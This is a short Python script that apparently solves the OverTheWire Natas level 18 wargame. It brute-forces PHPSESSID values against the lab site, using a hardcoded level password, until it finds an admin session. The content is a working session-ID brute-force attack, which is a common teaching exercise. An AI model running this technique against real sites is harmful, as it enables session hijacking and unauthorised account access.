import requests
import time

url = "http://natas18.natas.labs.overthewire.org"

for id in range(641):
    login_resp = requests.post(
        url,
        auth=("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"),
        params={"username": "natas19", "password": "password"},
        headers={"Cookie": f"PHPSESSID={id}"},
    )
    if "You are an admin" in login_resp.text:
        print(id)
        print(login_resp.text)
        break
